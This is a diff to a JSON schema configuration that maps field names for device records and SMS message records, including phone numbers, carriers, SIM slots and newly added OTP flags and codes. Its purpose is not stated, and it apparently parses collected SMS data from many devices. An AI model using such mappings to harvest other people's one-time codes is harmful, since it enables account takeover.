@@ -1,5 +1,5 @@
 {
-  "schema_version": "1.0",
+  "schema_version": "3.0",
   "default_schema": "auto",
   "schemas": {
     "silentgate": {
@@ -7,24 +7,28 @@
       "message_path": "/messages/{device_id}",
       "mappings": {
         "device_id": ["deviceId", "id", "gateway_id", "$key"],
-        "phone_number": ["phoneNumber", "phone", "number", "mobNo"],
-        "carrier": ["carrier", "operator", "network", "service_provider"],
+        "phone_number": ["mobNo", "phoneNumber", "phone", "number"],
+        "carrier": ["service_provider", "carrier", "operator", "network"],
         "status": ["status", "online"],
         "battery": ["battery"],
-        "model": ["model", "modelName"],
+        "model": ["modelName", "model"],
         "sims_array": "sims",
         "sim_item": {
-          "slot": ["slot", "simSlotIndex", "index"],
-          "phone_number": ["phoneNumber", "phone", "number", "mobNo"],
-          "carrier": ["carrier", "operator", "network", "carrierName", "service_provider"]
+          "slot": ["simSlotIndex", "slot", "subId", "index"],
+          "phone_number": ["phoneNumber", "mobNo", "number", "phone"],
+          "carrier": ["carrierName", "carrier", "service_provider", "operator", "network"]
         }
       },
       "message_mappings": {
         "id": ["id", "$key"],
-        "body": ["body", "message", "text"],
-        "sender": ["from", "sender"],
-        "timestamp": ["timestamp", "dateTime", "time"],
-        "type": ["type"]
+        "body": ["message", "messagePreview", "body", "text"],
+        "sender": ["sender", "from"],
+        "sender_type": ["senderType"],
+        "timestamp": ["timestamp", "dateTime", "isoTime", "time"],
+        "type": ["type", "direction"],
+        "sim_slot": ["simSlotIndex", "simSlot", "slot"],
+        "is_otp": ["isOtp"],
+        "otp_code": ["otpCode"]
       }
     },
     "legacy_rich": {
@@ -32,24 +36,28 @@
       "message_path": "/messages/{device_id}",
       "mappings": {
         "device_id": ["deviceId", "id", "clientId", "$key"],
-        "phone_number": ["mobNo", "phoneNumber", "number", "phone"],
+        "phone_number": ["mobNo", "phoneNumber", "phone", "number"],
         "carrier": ["service_provider", "carrierName", "network", "operator", "carrier"],
         "status": ["status"],
         "battery": ["battery"],
         "model": ["modelName", "model"],
         "sims_array": "sims",
         "sim_item": {
-          "slot": ["simSlotIndex", "slot", "index"],
+          "slot": ["simSlotIndex", "slot", "subId", "index"],
           "phone_number": ["phoneNumber", "mobNo", "number", "phone"],
           "carrier": ["carrierName", "service_provider", "network", "operator", "carrier"]
         }
       },
       "message_mappings": {
         "id": ["id", "$key"],
-        "body": ["message", "body", "text"],
+        "body": ["message", "messagePreview", "body", "text"],
         "sender": ["sender", "from"],
-        "timestamp": ["dateTime", "timestamp", "time"],
-        "type": ["type"]
+        "sender_type": ["senderType"],
+        "timestamp": ["dateTime", "timestamp", "isoTime", "time"],
+        "type": ["type", "direction"],
+        "sim_slot": ["simSlotIndex", "simSlot", "slot"],
+        "is_otp": ["isOtp"],
+        "otp_code": ["otpCode"]
       }
     },
     "legacy_light": {
@@ -65,10 +73,10 @@
       },
       "message_mappings": {
         "id": ["id", "$key"],
-        "body": ["message", "body", "text"],
+        "body": ["message", "messagePreview", "body", "text"],
         "sender": ["sender", "from"],
-        "timestamp": ["dateTime", "timestamp", "time"],
-        "type": ["type"]
+        "timestamp": ["dateTime", "timestamp", "isoTime"],
+        "type": ["type", "direction"]
       }
     },
     "legacy_dual": {
@@ -84,10 +92,10 @@
       },
       "message_mappings": {
         "id": ["id", "$key"],
-        "body": ["message", "body", "text"],
+        "body": ["message", "messagePreview", "body", "text"],
         "sender": ["sender", "from"],
-        "timestamp": ["dateTime", "timestamp", "time"],
-        "type": ["type"]
+        "timestamp": ["dateTime", "timestamp", "isoTime"],
+        "type": ["type", "direction"]
       }
     }
   }
